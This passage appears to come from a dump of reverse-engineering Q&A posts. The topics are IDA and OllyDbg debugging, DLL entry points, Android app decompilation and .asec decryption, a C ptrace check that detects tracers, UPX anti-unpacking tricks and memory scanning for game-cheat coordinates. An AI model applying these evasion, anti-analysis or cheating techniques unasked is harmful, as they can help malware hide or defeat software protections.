","<p>Since IDA is a 32 bit process, it can only debug x64 binaries remotely (<a href=""https://www.hex-rays.com/products/ida/debugger/"">source</a>). </p>

<p>To do that, you need to use the <code>IDA X.X/dbgsrv/win64_remotex64.exe</code> file and start a debugger. Once the debugger is running, you can connect to it ""remotely"" and debug. You can check <a href=""https://www.hex-rays.com/products/ida/debugger/cross-win-linux/win32towin64.shtml"">this tutorial</a> for more specific details.</p>
","11439"
"Difference between DllMain and DllEntryPoint","10967","","<p>I have a piece a malware I was share with. (I do this for fun, anyways)
Is a DLL according to the <code>IMAGE_FILE_HEADER-&gt;Characteristics</code>. I was trying to do some dynamic analysis on it. I have done the following:</p>

<ul>
<li>Run it with <code>rundll32.exe</code>, by calling its exports. Nothing.</li>
<li>Changed the binary's characteristics to an exe. Nothing. </li>
</ul>

<p>So I moved on to static analysis, Loaded on IDA and OllyDbg. 
Which brings me to my question. :)</p>

<p><strong>What is the main difference between <code>DllMain</code> and <code>DllEntryPoint</code>?</strong></p>

<p><strong>When/How does one get call vs the other?</strong></p>

<p><strong>[EDIT]</strong></p>

<p>So after reading MSDN and a couple of books on MS programming. I understand <code>DllEntryPoint</code>.
<code>DllEntryPoint</code> is your <code>DllMain</code> when writing your code. Right?!
So then why have <code>DllMain</code>. In other words, when opening the binary in IDA you have <code>DllEntryPoint</code> and <code>DllMain</code>. </p>

<p>I know it is probably something easy but I am visual person, so obviously not seeing something here.</p>
","<p>Both, <code>DllMain</code> and <code>DllEntryPoint</code> are merely symbolic names of the same <em>concept</em>. They even share the same prototype. But they aren't the same:</p>

<blockquote>
  <p>The function must be defined with the <code>__stdcall</code> calling convention.
  The parameters and return value must be defined as documented in the
  Win32 API for <code>WinMain</code> (for an .exe file) or <code>DllEntryPoint</code> (for a DLL).
  It is recommended that you let the linker set the entry point so that
  the C run-time library is initialized correctly, and C++ constructors
  for static objects are executed.</p>
  
  <p>(MSDN Library from Visual Studio 2005)</p>
</blockquote>

<p>The entry point in a DLL is the same as in an EXE <em>technically</em>, but with different semantics and prototype (EXE vs. DLL). Both are to be found at <code>IMAGE_OPTIONAL_HEADER::AddressOfEntryPoint</code>. However, in a DLL this entry point is optional (although usually supplied by the runtime library). <strong>The entry point isn't explicitly exported through the export directory</strong> (although IDA for example shows them under ""Exports""). Most of the time there is no public name attached to this entry point, which is why the documentation refers to it as <code>DllEntryPoint</code>. If you find this name in the export directory of the PE file it's probably not the actual entry point from the PE optional header (this would have to be confirmed by looking at the exact sample, though). The last point, btw, holds for <code>DllMain</code> as well.</p>

<p><a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms682583%28v=vs.85%29.aspx"" rel=""nofollow noreferrer""><code>DllMain</code></a> is the name the <strong>runtime library</strong> (ATL, MFC ...) implementation expects you to supply. It's a name the linker will see <em>referenced</em> from the default implementation of <code>DllEntryPoint</code> which is named <code>_DllMainCRTStartup</code> in the runtime implementations. See the CRT source files <code>crtdll.c</code> and <code>dllcrt0.c</code> if you have Visual Studio.</p>

<p>This means that <code>DllEntryPoint</code> <strong>calls</strong> <code>DllMain</code> - assuming default behavior. The runtime-implemented entry point function (<code>_DllMainCRTStartup</code>) does other initialization.</p>

<p>You can override this name by using the <a href=""http://msdn.microsoft.com/en-us/library/f9t8842e%28v=vs.80%29.aspx"" rel=""nofollow noreferrer""><code>/entry</code> command line switch</a> to the linker. Again, it's just a name and you can choose whatever you fancy. The limitations (not being able to load another DLL using <code>LoadLibrary</code> from within the entry point and so on) are independent of the name you give the function.</p>

<hr>

<p>Side-note: in an EXE the TLS callbacks run before the entry point code, which can be dangerous in malware research. <s>I don't think this is relevant to DLLs, though, but if someone has more knowledge in that area I'm interested to see pointers to material.</s></p>

<p><a href=""https://reverseengineering.stackexchange.com/users/1323/peter-ferrie"">Peter Ferrie</a>, a distinguished reverser and malware analyst, pointed out in a comment to this answer:</p>

<blockquote>
  <p>TLS callbacks always run in statically-linked DLLs, and since Vista,
  they also run in dynamically-linked DLLs! For more information, see my
  <a href=""http://pferrie.host22.com/papers/com2008.htm"" rel=""nofollow noreferrer"">TLS presentations</a>, and of
  course my <a href=""http://pferrie.host22.com/papers/unp2011.htm"" rel=""nofollow noreferrer"">""Ultimate"" Anti-Debugging Reference</a></p>
</blockquote>

<p>Thanks Peter.</p>
","2089"
"Analyzing encrypted Android apps (.asec)?","10461","","<p>I've been trying to reverse engineer a paid android app that writes out some binary data so that I can export that data into other programs (it's a run/walk timer app, if anyone's curious, and I'm trying to get its GPS traces out). However, it looks like the apk is encrypted and stored in <code>/data/app-asec/[app_id].asec</code>.</p>

<p>There's a nice <a href=""http://nelenkov.blogspot.com/2012/07/using-app-encryption-in-jelly-bean.html"">blog post</a> that says the encryption used is TwoFish, with a key stored in <code>/data/misc/systemkeys/AppsOnSD.sks</code>, but I haven't been able to decrypt the file using the naïve strategy of just using that key directly with TwoFish on the <code>.asec</code>.</p>

<p>How can I decrypt this to get an apk I can actually analyze?</p>

<p>Note: I realize that this information is considered somewhat delicate in places like xda-developers, since it could be used to enable piracy. I have no such intentions, I just want to examine the serialization code.</p>
","<p>After a little bit more work and some more careful re-reading, I figured out my mistake: the files in <code>/data/app-asec/</code> are the encrypted <em>containers</em>. They're actually dm-crypt volumes, which then get mounted at <code>/mnt/asec/[app_id]</code>. The <code>pkg.apk</code> in that directory is the unencrypted apk that can be analyzed using any of the fine tools in <a href=""https://reverseengineering.stackexchange.com/a/46/257"">this answer</a>.</p>
","1877"
"Decompiling Android application","10404","","<p>The Android java code is compiled into Dalvik byte code, which is quite readable. I wonder, is it possible in theory and in practice to write a decompilation software for Dalvik byte code?</p>
","<p>It's not only possible but has been done already, and not just once. Here's three I know about, and there may be more.</p>

<ol>
<li><p>Kivlad by Cody Brocious</p>

<p><a href=""http://www.matasano.com/research/kivlad/"">http://www.matasano.com/research/kivlad/</a></p></li>
<li><p>DAD by Zost (Androguard project):</p>

<p><a href=""http://code.google.com/p/androguard/wiki/Decompiler"">http://code.google.com/p/androguard/wiki/Decompiler</a></p></li>
<li><p>JEB by Nicolas Falliere (commercial)</p>

<p><a href=""http://www.android-decompiler.com/"">http://www.android-decompiler.com/</a></p></li>
</ol>

<p>Then there are all the Java decompilers that can be used after using <a href=""http://code.google.com/p/dex2jar/""><code>dex2jar</code></a> or <a href=""http://siis.cse.psu.edu/dare/index.html"">Dare</a> on the Dalvik binary.</p>
","46"
"Get jar back from wrapped(into exe) jar","10316","","<p>Is there any way to get a jar file from a jar wrapped using a exe wrapper.
I have an exe file and I know that it was wrapper using exe wrapper (<a href=""http://launch4j.sourceforge.net/"">launch4j</a> to be precise).
How do I unwrap this jar to get back the jar.
I have seen that I can unwrap it in Linux using <a href=""http://fileroller.sourceforge.net/"">fileroller</a>, how do I do it in windows</p>

<pre><code>ADD : How is it different if it wrapped using wrappers other than launch4j
</code></pre>
","<hr>

<p>I was really checking on it and it seems there is a really easy way to do this.</p>

<p>PROGRAM USED : <a href=""http://jd.benow.ca/"" rel=""nofollow noreferrer"">jd-gui</a></p>

<hr>

<p><strong>STEPS</strong></p>

<ol>
<li><p>Extract the exe file using any archive manager (eg:WinRar)</p></li>
<li><p>Now use this program (<a href=""http://jd.benow.ca/"" rel=""nofollow noreferrer"">jd-gui</a>) to decompile it.</p>

<p><img src=""https://i.stack.imgur.com/6UtLu.jpg"" alt=""jd-gui""></p></li>
<li><p>You are done and now you have the code in native java form</p></li>
</ol>
","3905"
"How can I prevent Immunity Debugger / OllyDbg from breaking on attach?","10193","","<p>When I attach OllyDbg or ImmunityDebugger to a process, it automatically breaks execution. I'm attaching to a user-mode service running as SYSTEM and only need to catch exceptions, so this is not ideal. Is there a way to disable the break-on-attach behaviour?</p>
","<h1>Explanation</h1>

<p>The break on attach is due to the <code>ntdll</code> <code>DbgUiRemoteBreakin</code> and <code>DbgBreakPoint</code> functions being called. If you check the <code>kernel32</code> <code>DebugActiveProcess</code> function called by the debugger, OllyDbg or ImmunityDebugger, you will see a call to the <code>CreateRemoteThread</code>, <code>CreateRemoteThreadEx</code>, or <code>ZwCreateThreadEx</code> function depending on your OS.</p>

<p>So, i guess one way to bypass breaking is:</p>

<ol>
<li>debug the debugger itself</li>
<li>go to the <code>DbgUiIssueRemoteBreakin</code> function and spot the call to the function creating the remote thread.</li>
<li>change the <code>lpStartAddress</code> parameter in case of <code>CreateRemoteThread</code>/<code>CreateRemoteThreadEx</code> to <code>DbgBreakPoint</code>+1 <code>RETN 0xC3</code></li>
</ol>

<h1>Plugin</h1>

<p>I created an OllyDbg v1.10 <a href=""http://code.google.com/p/ollytlscatch/downloads/detail?name=SilentAttach.dll"">plugin</a> which <code>NOP</code>s the <code>INT3</code> in <code>DbgBreakPoint</code> in the process with the PID you choose. It has only been tested on Windows 7.</p>

<h2>Usage</h2>

<p>Place SilentAttach.dll in OllyDbg directory, fire OllyDbg, Press <kbd>Alt</kbd>+<kbd>F12</kbd>, and then enter process Id of the process you want to silently attach to.</p>

<p>N.B.
Since no break occurs, OllyDbg does not extract many piece of info. e.g. list of loaded module. So, you have to activate the context by something like <kbd>Alt</kbd>+<kbd>E</kbd> then <kbd>Alt</kbd>+<kbd>C</kbd></p>
","1750"
"Detecting tracing in Linux","9884","","<p>Under Linux it's possible to trace exactly the kernel system calls with <code>strace</code>.
<code>ltrace</code> can be used also to trace library calls.
I wonder if it's possible to detect if my executable is running under <code>strace</code> or <code>ltrace</code> ?</p>

<p>Here's an example of the output of <code>strace</code> and <code>ltrace</code> for the <code>diff</code> executable.</p>

<p><strong>strace</strong> </p>

<pre><code>$ strace diff
execve(""/usr/bin/diff"", [""diff""], [/* 43 vars */]) = 0
brk(0)                                  = 0x110a000
access(""/etc/ld.so.nohwcap"", F_OK)      = -1 ENOENT (No such file or directory)
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fcbc13f6000
access(""/etc/ld.so.preload"", R_OK)      = -1 ENOENT (No such file or directory)
open(""/etc/ld.so.cache"", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=122500, ...}) = 0
mmap(NULL, 122500, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fcbc13d8000
close(3)                                = 0
access(""/etc/ld.so.nohwcap"", F_OK)      = -1 ENOENT (No such file or directory)
open(""/lib/x86_64-linux-gnu/librt.so.1"", O_RDONLY|O_CLOEXEC) = 3
read(3, ""\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0\340!\0\0\0\0\0\0""..., 832) = 832
fstat(3, {st_mode=S_IFREG|0644, st_size=31784, ...}) = 0
mmap(NULL, 2129016, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7fcbc0fce000
mprotect(0x7fcbc0fd5000, 2093056, PROT_NONE) = 0
mmap(0x7fcbc11d4000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x6000) = 0x7fcbc11d4000
close(3)                                = 0
access(""/etc/ld.so.nohwcap"", F_OK)      = -1 ENOENT (No such file or directory)
open(""/lib/x86_64-linux-gnu/libc.so.6"", O_RDONLY|O_CLOEXEC) = 3
read(3, ""\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0\200\30\2\0\0\0\0\0""..., 832) = 832
fstat(3, {st_mode=S_IFREG|0755, st_size=1811160, ...}) = 0
mmap(NULL, 3925240, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7fcbc0c0f000
mprotect(0x7fcbc0dc4000, 2093056, PROT_NONE) = 0
mmap(0x7fcbc0fc3000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1b4000) = 0x7fcbc0fc3000
mmap(0x7fcbc0fc9000, 17656, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7fcbc0fc9000
close(3)                                = 0
access(""/etc/ld.so.nohwcap"", F_OK)      = -1 ENOENT (No such file or directory)
open(""/lib/x86_64-linux-gnu/libpthread.so.0"", O_RDONLY|O_CLOEXEC) = 3
read(3, ""\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0\200l\0\0\0\0\0\0""..., 832) = 832
fstat(3, {st_mode=S_IFREG|0755, st_size=135398, ...}) = 0
mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fcbc13d7000
mmap(NULL, 2212936, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7fcbc09f2000
mprotect(0x7fcbc0a0a000, 2093056, PROT_NONE) = 0
mmap(0x7fcbc0c09000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x17000) = 0x7fcbc0c09000
mmap(0x7fcbc0c0b000, 13384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7fcbc0c0b000
close(3)                                = 0
mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fcbc09f1000
mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fcbc09f0000
mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fcbc09ef000
arch_prctl(ARCH_SET_FS, 0x7fcbc09f0700) = 0
mprotect(0x7fcbc0fc3000, 16384, PROT_READ) = 0
mprotect(0x7fcbc0c09000, 4096, PROT_READ) = 0
mprotect(0x7fcbc11d4000, 4096, PROT_READ) = 0
mprotect(0x61b000, 4096, PROT_READ)     = 0
mprotect(0x7fcbc13f8000, 4096, PROT_READ) = 0
munmap(0x7fcbc13d8000, 122500)          = 0
set_tid_address(0x7fcbc09f09d0)         = 32425
set_robust_list(0x7fcbc09f09e0, 0x18)   = 0
futex(0x7fff27e5992c, FUTEX_WAIT_BITSET_PRIVATE|FUTEX_CLOCK_REALTIME, 1, NULL, 7fcbc09f0700) = -1 EAGAIN (Resource temporarily unavailable)
rt_sigaction(SIGRTMIN, {0x7fcbc09f8750, [], SA_RESTORER|SA_SIGINFO, 0x7fcbc0a01cb0}, NULL, 8) = 0
rt_sigaction(SIGRT_1, {0x7fcbc09f87e0, [], SA_RESTORER|SA_RESTART|SA_SIGINFO, 0x7fcbc0a01cb0}, NULL, 8) = 0
rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
brk(0)                                  = 0x110a000
brk(0x112b000)                          = 0x112b000
open(""/usr/lib/locale/locale-archive"", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=7216624, ...}) = 0
mmap(NULL, 7216624, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fcbc030d000
close(3)                                = 0
sigaltstack({ss_sp=0x61c5e0, ss_flags=0, ss_size=8192}, NULL) = 0
open(""/usr/share/locale/locale.alias"", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=2570, ...}) = 0
mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fcbc13f5000
read(3, ""# Locale name alias data base.\n#""..., 4096) = 2570
read(3, """", 4096)                       = 0
close(3)                                = 0
munmap(0x7fcbc13f5000, 4096)            = 0
open(""/usr/share/locale/en_US/LC_MESSAGES/diffutils.mo"", O_RDONLY) = -1 ENOENT (No such file or directory)
open(""/usr/share/locale/en/LC_MESSAGES/diffutils.mo"", O_RDONLY) = -1 ENOENT (No such file or directory)
open(""/usr/share/locale-langpack/en_US/LC_MESSAGES/diffutils.mo"", O_RDONLY) = -1 ENOENT (No such file or directory)
open(""/usr/share/locale-langpack/en/LC_MESSAGES/diffutils.mo"", O_RDONLY) = -1 ENOENT (No such file or directory)
rt_sigaction(SIGSEGV, {0x40b3c0, [], SA_RESTORER|SA_STACK|SA_NODEFER|SA_RESETHAND|SA_SIGINFO, 0x7fcbc0c454a0}, NULL, 8) = 0
write(2, ""diff: "", 6diff: )                   = 6
write(2, ""missing operand after `diff'"", 28missing operand after `diff') = 28
write(2, ""\n"", 1
)                       = 1
write(2, ""diff: "", 6diff: )                   = 6
write(2, ""Try `diff --help' for more infor""..., 39Try `diff --help' for more information.) = 39
write(2, ""\n"", 1
)                       = 1
exit_group(2)                           = ?
</code></pre>

<p><strong>ltrace</strong> </p>

<pre><code>$ ltrace diff
__libc_start_main(0x402310, 1, 0x7fff876fcf28, 0x4151d0, 0x415260 &lt;unfinished ...&gt;
strrchr(""diff"", '/')                                             = NULL
setlocale(6, """")                                                 = ""en_US.UTF-8""
bindtextdomain(""diffutils"", ""/usr/share/locale"")                 = ""/usr/share/locale""
textdomain(""diffutils"")                                          = ""diffutils""
sigaltstack(0x7fff876fccd0, 0, 1, 0x736c6974756666, 3)           = 0
dcgettext(0, 0x4183d7, 5, -1, 3)                                 = 0x4183d7
dcgettext(0, 0x4183e5, 5, 0, 1)                                  = 0x4183e5
sigemptyset(0x7fff876fccf8)                                      = 0
sigaction(11, 0x7fff876fccf0, NULL)                              = 0
re_set_syntax(264966, 0x7fff876fcb88, 0, -1, 0)                  = 0
malloc(16)                                                       = 0x016e1160
memset(0x016e1160, '\000', 16)                                   = 0x016e1160
getopt_long(1, 0x7fff876fcf28, ""0123456789abBcC:dD:eEfF:hHiI:lL:""..., 0x00417360, NULL) = -1
malloc(1)                                                        = 0x016e1180
dcgettext(0, 0x415598, 5, 8, 3)                                  = 0x415598
error(0, 0, 0x415598, 0x7fff876fd469, 1diff: missing operand after `diff'
)                         = 0
dcgettext(0, 0x415878, 5, 0, 0x7fad1793c700)                     = 0x415878
error(2, 0, 0x415878, 0x7fff876fd469, 1diff: Try `diff --help' for more information.
 &lt;unfinished ...&gt;
+++ exited (status 2) +++
</code></pre>
","<p>ptrace can be detected by the fact that an executable can only call ptrace once.
if ptrace() was already called by the strace executable, we can detect it in runtime.</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;sys/ptrace.h&gt;

int main()
{
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) 
    {
        printf(""don't trace me !!\n"");
        return 1;
    }
    // normal execution
    return 0;
}
</code></pre>

<p>However, it's not hard to break this code. first, it's possible just to <code>NOP</code> the <code>ptrace()</code> call.
Second, it's possible to replace <code>ptrace()</code> call with our own <code>ptrace()</code> call using <code>LD_PRELOAD</code></p>
","1931"
"How to re-analyse a function in IDA Pro?","9574","","<p>I am working on an obfuscated binary. IDA did pretty good job distinguishing code from junk. However, I had started messing around with a function changing from <code>code</code> to <code>data</code> and  vice versa and completely messed the function up and destroyed the way it looked like. I don't want to start new database on the executable and re-do all my work. </p>

<p>Is there a way to re-analyse a single function and return it to the way it looked like after initial analysis?</p>
","<p>Well you have to first Undefine the code using U key and they select the code and right click you will have some options like C (code) and so on. IDA almost give you ability of doing anything wih obfuscated code to help you to understand code correctly.</p>

<p><em>Addendum</em>
After converting to C (code), do Alt+P to create/edit function. In addition, rebuild layout graph by go to Layout view, right clicking empty space and selecting ""Layout graph"".</p>
","2310"
"How to prevent ""upx -d"" on an UPX packed executable?","9287","","<p>I recently read a <a href=""https://twitter.com/corkami/status/417604202236350464/photo/1"" rel=""nofollow noreferrer"">tweet</a> from <a href=""https://reverseengineering.stackexchange.com/users/188/ange"">Ange</a> about a technique to fool UPX when the option <code>-d</code> (decompress) is called.</p>

<p>I would like to know how this is working and, what are the technique to prevent an UPX packed executable to be decompressed through <code>upx -d</code> (if possible for, both, Linux and Windows).</p>
","<p>UPX doesn't check the unpacking stub's integrity, and just blindly restores the data from the stored information, not from the actual execution.</p>

<p>Since UPX is open-source and documented (<a href=""https://corkami.googlecode.com/files/upx-idb.zip"">commented IDB</a>), it's easy to modify its and actually do something extra (anti-debug, patch, decryption, jump to real entrypoint...) that will be lost when 'upx -d' is used.</p>

<p>Such UPX hack is not uncommon in malware.</p>
","3324"
"What hints in machine code can point me to the compiler which was used to generate it?","9168","","<p>When I am looking at the machine code of an application, are there hints and patterns I can discern from the generated machine code which would indicate which compiler (and possibly version) was used to generate it?</p>

<p>Does knowing the compiler used to generate an application help me to more effectively reverse engineer back from the generated object to what the source code might have been, and if it does help, how so?</p>
","<p>There is some academic research in this area, the keywords you want are 'toolchain provenance'. There was a pretty good paper by <a href=""ftp://ftp.cs.wisc.edu/paradyn/papers/Rosenblum10prov.pdf"">Nate Rosenblum on this topic</a>, it's been a while since I read this paper but you can use many techniques to establish this information. I think some use machine learning and others can use a big pile of heuristics or axioms about compiler behavior. </p>

<p>Establishing this is of limited utility IMO. It could be useful in an adversarial situation where you're trying to get intelligence about a malware group or threat actor, but also keep in mind that this kind of information can be obfuscated or destroyed. One potential use of this information would be to establish that some binary software was compiled using some companies SDK that included a compiler with signature information unique to that company. Establishing the tool chain provenance can help you make a case that someone who bought your SDK is in violation of a license or contract, say by producing malware. </p>

<p>An example of behavior differences is parameter writing. There are two ways to place a value onto the stack, one using 'push' and another using <code>mov</code> with an address based in <code>esp</code> as the destination operand. So one compiler can do this:</p>

<pre>
push eax
push ebx
</pre>

<p>And another can do this:</p>

<pre>
mov [esp+foo], eax
mov [esp+foo+4], ebx
</pre>

<p>And they do. Generally, MSVC does the first example and GCC does the second example, at least in some very limited testing/observation just now...</p>
","21"
"Could not find main function in IDA pro?","8960","","<p>I have newbie question that concerns IDA pro and Visual studio 2010. Basically I started a new ""Empty Project"" in VS 2010 and added a main function to the .cpp file. Then I compiled it to binary and opened up the binary using IDA Pro. However, I could not locate the main function. Why is that?</p>
","<p>Open Exports view in IDA (Views-->Open subviews-->Exports).
You'll see there one function name.
It is the real main function of the program (which is possibly not your main function, but your main function will be called somehow from it).</p>

<p>Actually you can not find main function by name because this information does not exist in the executable: the computer doesn't need it for program execution.
Information about function, variable and type names and relation between CPU instructions and lines of real source code called ""debug information"" and 
stored in different place, which is .PDB file in your specific case.</p>

<p>So if you compiled your program with debug information (which is default) loading .PDB file 
(File-->Load File-->PDB file) will possibly be helpful.</p>
","3447"
"How to find arrays of objects (entities, enemies) in a game I'm reversing with Cheat Engine?","8959","","<p>I am reversing a game using Cheat Engine and OllyDBG, through this memory addresses within an FPS game  are read and monitored, these addresses will contain the coordinates(xyz) of enemies.</p>

<p>My Objective is to find an address or a pattern that will allow me to loop through up to 32 enemies in order to read all their coordinates, in order to do this I have been attempting to find a pattern between each of their addresses with no luck. I have been able to collect 3 different enemy addresses, this information is useful but searching through 32 addresses is a task which requires more effort than I believe is necessary.</p>

<p>As stated I have access to the first 3 enemy addresses and if from that information it is possible to trace back to the base either through Cheat Engine or other reverse engineering software the process would be appreciated.</p>

<p>Ultimately my question is, is there a way to detect a pointer array in memory from one of its addresses, for example if if I have 3 enemy coordinates can I somehow trace the memory location back to an address that accesses all 32 enemy addresses whether it is by using cheat engine or another reversing tool.</p>
","<p><em>(OP didn't specify if he knows how structures are laid out. Looks like he assumes they aren't complex. I'll answer a more general question to avoid locality issues by assuming the structures are somewhat complex)</em></p>

<p>Few ways to find the other structures come to mind:</p>

<h2>Scanning memory for signatures</h2>

<p>Once you have a few examples of the structures, maybe the easiest way to find the other structure instances is to find matching constants in all three structures. Some values may be constant, represent properties that apply to all the enemy entities in a more high-level class inherited.</p>

<h3>Pros:</h3>

<ul>
<li>This is easy to implement, can be done this Cheat Engine.</li>
<li>in the general case it should survive program restarts, you won't need to find the three structures every time you run the game.</li>
</ul>

<h3>Cons:</h3>

<ul>
<li>not so robust. stuff might change between versions, data you think is constant may actually change in some cases you haven't looked at. </li>
</ul>

<h2>Pointer searching</h2>

<p>There might be a pointer to each entity somewhere. you can just as easily search the memory for the addresses of the structures you found, and detect the array/structure that holds all of the entities. you could also walk trough arrays you find in the structures themselves, you might be looking at a linked list.</p>

<h3>Pros:</h3>

<ul>
<li>easy to implement.</li>
<li>will be a bit more robust than the previous method.</li>
</ul>

<h3>Cons:</h3>

<ul>
<li>you will still need to somehow find the first entities.</li>
</ul>

<h2>Finding the Constructor/constructor-like function</h2>

<p>Either Object Oriented language like C++ or ObjC, or a procedural language like C, there must be a function that initiates the structure. usually it's easy to find - the first function called after the object is allocated, pretty distinctive assembly - mostly initialization code.</p>

<p>If we're talking about OO code, finding the virtual function table or a similar construct will let you easily find the construction functions, walk trough inheritance and find at least a portion of the manipulating functions.</p>

<p>After you get the Constructors you can easily get all the allocations, and see where pointers are being kept.</p>

<h3>Pros:</h3>

<ul>
<li>quite robust</li>
<li>better understanding of how entities are saved in memory.</li>
</ul>

<h3>Cons:</h3>

<ul>
<li>Static RE. usually harder to do (Get a good dis-assembler)</li>
</ul>

<h2>Reversing the structure</h2>

<p>This one requires a bit more reversing work, but will let you find the best ways to search for the entities. Using Cheat Engine and IDA, manually map the structure, the elements/members, the functions that manipulate the structure.</p>

<p>If there're any pointers involved, follow them and reverse other structures you encounter.</p>

<h3>Pros:</h3>

<ul>
<li>Robust</li>
<li>The right way to do what you want. Really understand what's going on. facilitate future abilities/features.</li>
</ul>

<h3>Cons:</h3>

<ul>
<li>more work, and harder to do. A lot of RE.</li>
</ul>

<h2>Note</h2>

<p>for at-least some of the methods I mentioned finding the pointers to all entities while analyzing the program might only be the first step. You can search for references to the list itself and get a better way to automatically find the entities on each program restart. This eliminates some of the Cons.</p>
","2177"
"How to debug (like gdb) with radare2?","8922","","<p>im new at radare2 and linux. I got problem with r2.</p>

<p>As title, many tutorials, articles, videos about r2 is just disassemble the program, and read asm code. But i wanna debug my program.</p>

<p>I search from youtube, gg, git-hub... But all fail (or maybe i dont know how to run it).</p>

<p>I hope someone teach me in detail or give me some hint,
thank you.</p>
","<p>Go to archives of <a href=""http://hack.lu"" rel=""noreferrer"">hack.lu</a> conference <a href=""http://archive.hack.lu/2015/"" rel=""noreferrer"">here</a>.</p>

<p>You can find there Radare2 <a href=""http://archive.hack.lu/2015/radare2-workshop-slides.pdf"" rel=""noreferrer"">workshop</a> <a href=""http://archive.hack.lu/2015/radare2-workshop/"" rel=""noreferrer"">materials</a>.
There are some mentions of debugging there.</p>

<p>In addition you have a radare 2 book, see <a href=""https://radare.gitbooks.io/radare2book/content/introduction/basic_debugger_session.html"" rel=""noreferrer"">basic debugging session</a> chapter.
I'd suggest to read all the book and workshop materials.</p>
","11208"
"IDA Pro List of Functions with Instruction","8866","","<p>I have a DLL with a large number of functions in IDA Pro. I would like to make a script that can scan the instructions within each of the functions looking for a specific instruction. For my specific case right now, I am looking for functions that shift left (shl). I am not sure which register is being shifted so I would like to keep it versatile. I do know that it is only shifting one place in this specific case.</p>

<p>I know python on a very basic level, and I know IDA-Python on a non-existent level. Please help me with suggestions on how to access this data inside IDA.</p>

<p>Edit:<br>
I have read through <a href=""https://stackoverflow.com/questions/8860020/is-there-a-way-to-export-function-names-from-ida-pro?rq=1"">this question</a> and it says that there is no direct access to the list of functions that have been discovered by IDA.  You have to specify a starting function address.  Is there any better way to list functions?</p>
","<p>While in the Text View of the disassembly window, press <kbd>Alt + T</kbd>. In the Text Search window, search for <code>shl</code> and check <code>Find all occurrences</code>:</p>

<p><img src=""https://i.stack.imgur.com/OR0Mt.png"" alt=""Text Search window""></p>

<p>Press <code>OK</code> and you will get a list of all functions that contain <code>shl</code>:</p>

<p><img src=""https://i.stack.imgur.com/dCWjK.png"" alt=""Occurrences of: shl""></p>
","2496"
"Ollydbg does not find all referenced strings while Reverse Engineering AoneVideo2AudioConverter","8799","","<p>I am following <a href=""http://securityxploded.com/reverse-engineering-video-converter.php"" rel=""nofollow noreferrer"">this</a> tutorial on reverse engineering. In the step where I ""search for all referenced strings"" I get a window as follows:</p>

<p><img src=""https://i.stack.imgur.com/fdlgI.png"" alt=""enter image description here""></p>

<p>When compared to the image on the tutorial for the step, I found that the column headings of my window are : <strong>Address Command Comments</strong> where as according to the tutorial it is supposed to be: <strong>Address Disassembly Text String</strong> (It is not seen on the tutorial but I dig the internet before making this post).</p>

<p>I am using Windows 8.1. I have run Ollydbg as administrator with compatibility mode for Windows 7 and Windows XP SP3, used Ollydbg 1.10 and 2.0 but I get same results. The module loaded is also the correct (not the ntdll). The exe version is a different one but I installed it and the overall functionality of the new version is still the same - gives out the exactly same error message for invalid registration.</p>

<p>What am I doing wrong/missing here?? What might be the reason of this and how can I overcome it?</p>
","<p><strong>possibilities:</strong></p>

<ol>
<li>Maybe the protection has been changed as @Guntram Blohm said.</li>
<li>Have you checked your OllyDBG version. I guess this problem might have been occurred because your version doesn't support OS architecture or to be more specific, it doesn't have the proper plugins.</li>
</ol>

<p><strong>Suggestions:</strong></p>

<ul>
<li>Try to use ""R4ndoms_OllyDBG"" mod of OllyDBG... it's compatible with Win 7/8 x86/x64.</li>
<li>Don't go after strings, try to go after the api (that you think it's being implemented), or you can look in the stack.</li>
<li>Use another debugger like x64dbg or IDA Pro.</li>
</ul>
","9097"
"Find reference to string in radare2","8182","","<p>In this crackme <a href=""http://www.crackmes.de/users/josamont/crack_serial_in_linux/solutions/mrmacete/browse/crackserial_linux_mrmacete_solution*solution.txt"">solution</a> first the strings are found: </p>

<pre><code>$ rabin2 -z crackserial_linux

addr=0x00000aa0 off=0x00000aa0 ordinal=000 sz=7 len=7 section=.rodata type=A string=User:
